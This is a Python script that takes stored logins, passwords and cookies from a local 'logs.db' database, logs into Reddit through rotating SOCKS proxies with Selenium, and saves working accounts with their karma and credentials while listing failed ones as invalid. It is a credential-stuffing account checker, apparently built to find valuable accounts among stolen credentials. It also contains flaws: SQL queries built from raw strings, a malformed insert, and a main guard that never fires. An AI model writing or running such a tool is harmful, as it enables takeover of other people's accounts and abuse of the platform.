import concurrent.futures
import json
import math
import os
import sqlite3
import threading
from time import sleep

import requests
from selenium import webdriver

thread_local = threading.local()


class ProxyList:
    proxies = []

    def __init__(self):
        with open('proxy_list/proxy.txt', 'r') as f:
            content = f.read().split('\n')[:-1]
            self.proxies = []
            for proxy in content:
                self.proxies.append(proxy.split(':'))


def get_session():
    if not hasattr(thread_local, "session"):
        thread_local.session = requests.Session()
    return thread_local.session


def ParseUsingCookie(login, password_, cookie_path, proxy):
    with sqlite3.connect('data/logs.db', check_same_thread=False) as conn:
        cursor = conn.cursor()
        cursor.execute(
            """CREATE TABLE IF NOT EXISTS HighKarma(login PRIMARY KEY, password TEXT, cookies TEXT, karma INT)""")
        cursor.execute(
            """CREATE TABLE IF NOT EXISTS InvalidAccounts(login PRIMARY KEY)""")
        if cursor.execute(f"SELECT * FROM HighKarma WHERE login = '{login}'").fetchall():
            return
        if cursor.execute(f"SELECT * FROM InvalidAccounts WHERE login = '{login}'").fetchall():
            return

        options = webdriver.FirefoxOptions()
        options.set_preference('network.proxy.type', 1)
        options.set_preference('network.proxy.socks', proxy[0])
        options.set_preference('network.proxy.socks_port', proxy[1])
        options.set_preference("network.proxy.socks_version", 5)
        options.set_preference("network.proxy.socks_username", proxy[2])
        options.set_preference("network.proxy.socks_password", proxy[3])
        driver = webdriver.Firefox(options=options)

        cookie = None
        for cookie_txt in os.listdir(cookie_path):
            try:
                cookie = cookies_from_file(cookie_path + '/' + cookie_txt)
                driver.add_cookie(cookie)
            except Exception:
                pass
        driver.get("https://www.reddit.com/login/")
        driver.refresh()
        username = driver.find_element('name', 'username')
        password = driver.find_element('name', 'password')
        username.send_keys(login)
        password.send_keys(password_)
        login_button = driver.find_element('xpath', '//button[@type="submit"]')
        try:
            login_button.click()
        except Exception:
            driver.close()
            return
        sleep(10.0)

        if driver.current_url == 'https://www.reddit.com/':
            # successful login
            # Close banner
            try:
                retard_button = driver.find_element('xpath',
                                                    "/html/body/div[1]/div/div[2]/div[4]/div/div/div/header/div/div[2]/button")
                retard_button.click()
            except Exception:
                pass

            try:
                karma = driver.find_element('xpath',
                                            "/html/body/div[1]/div/div[2]/div[1]/header/div/div[2]/div[2]/div/div[2]/button/span[1]/span/span/span[2]/span")
            except Exception:
                try:
                    karma = driver.find_element('xpath',
                                                '/html/body/div[2]/div[3]/span[1]/span')
                except Exception:
                    driver.close()
                    cursor.execute("INSERT INTO InvalidAccounts VALUES (?)",
                                   (login))
                    return

            total_karma = karma.text
            cursor.execute("INSERT INTO HighKarma VALUES (?,?,?,?)",
                           (login, password_, json.dumps(cookie), total_karma.split(" ")[0]))
            driver.close()
            return
        try:
            animated_form = driver.find_element("xpath", '/html/body/div/main/div[1]/div/div[2]/form/fieldset[1]/div')
            if animated_form.text == 'Incorrect username or password':
                cursor.execute("INSERT INTO InvalidAccounts VALUES (?)",
                               (login,))
            else:
                sleep(300)
        except Exception:
            driver.close()


def cookies_from_file(filename):
    with open(filename) as file:
        cookies_data = file.read().replace('\n', '').split(';')
    cookies_dict = {}
    for x in cookies_data:
        key = x.split('=')[0]
        value = x.split('=')[1]
        cookies_dict[key] = value
    return cookies_dict


def CheckKarma():
    pr = ProxyList()
    with sqlite3.connect('data/logs.db') as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT login FROM Passwords')
        table1 = list(zip(*cursor.fetchall()))[0]
        cursor.execute('SELECT password FROM Passwords')
        table2 = list(zip(*cursor.fetchall()))[0]
        cursor.execute('SELECT cookies FROM Passwords')
        table3 = list(zip(*cursor.fetchall()))[0]
        table4 = pr.proxies * (math.trunc(len(table1) / len(pr.proxies)) + 1)
        table4 = table4[:len(table1)]
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
            executor.map(ParseUsingCookie, table1, table2, table3, table4)


if __name__ == "main":
    CheckKarma()
